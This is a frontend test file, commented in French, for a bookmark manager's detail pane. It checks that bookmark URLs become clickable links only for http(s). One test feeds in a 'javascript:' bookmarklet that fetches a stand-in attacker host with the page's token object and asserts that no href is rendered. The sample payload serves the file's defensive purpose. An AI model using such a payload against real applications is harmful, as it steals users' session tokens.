// L'URL d'un signet est une DONNÉE (audit du 2026-09-23) : un bookmarklet
// `javascript:` rendu tel quel dans `href` deviendrait du script dans le
// webview qui porte le jeton local. Même borne que les liens du mode lecture
// (`lecture.ts` : http(s) seulement).
import { describe, it, expect, vi, beforeEach } from "vitest";
import { render, screen } from "@testing-library/react";
import { QueryClientProvider, QueryClient } from "@tanstack/react-query";
import { useEffect } from "react";
import { raindrop } from "../test/fixtures";
import { DetailPane } from "./DetailPane";
import { AppStateProvider, useAppState } from "../state/appState";

const { getApi, urlCourante } = vi.hoisted(() => ({ getApi: vi.fn(), urlCourante: { valeur: "" } }));
vi.mock("../lib/api", () => ({ api: { get: getApi, send: vi.fn() } }));
vi.mock("../hooks/useStaticData", () => ({ useCollections: () => ({ data: [] }) }));

beforeEach(() => {
  getApi.mockReset().mockImplementation((path: string) => {
    if (path === "/api/raindrops/1000") return Promise.resolve(raindrop({ id: 1000, url: urlCourante.valeur }));
    if (path === "/api/jobs") return Promise.resolve([]);
    if (path === "/api/backup/archives") return Promise.resolve({ ids: [], octets: 0 });
    return undefined;
  });
});

const Preselect = () => {
  const { selectRaindrop } = useAppState();
  useEffect(() => selectRaindrop(1000), []);
  return null;
};
const rendre = () =>
  render(
    <QueryClientProvider client={new QueryClient({ defaultOptions: { queries: { retry: false } } })}>
      <AppStateProvider>
        <Preselect />
        <DetailPane />
      </AppStateProvider>
    </QueryClientProvider>,
  );

describe("DetailPane — la ligne d'URL", () => {
  it("témoin : une URL https se suit", async () => {
    urlCourante.valeur = "https://exemple.fr/page";
    rendre();
    const texte = await screen.findByText("https://exemple.fr/page");
    expect(texte.closest("a")).toHaveAttribute("href", "https://exemple.fr/page");
  });

  it("un bookmarklet javascript: se LIT, sans lien à suivre", async () => {
    urlCourante.valeur = "javascript:fetch('//evil.example?t='+JSON.stringify(window.RAINDROP_GUI))";
    rendre();
    const texte = await screen.findByText(/^javascript:/);
    expect(texte.closest("a")).not.toHaveAttribute("href");
  });
});
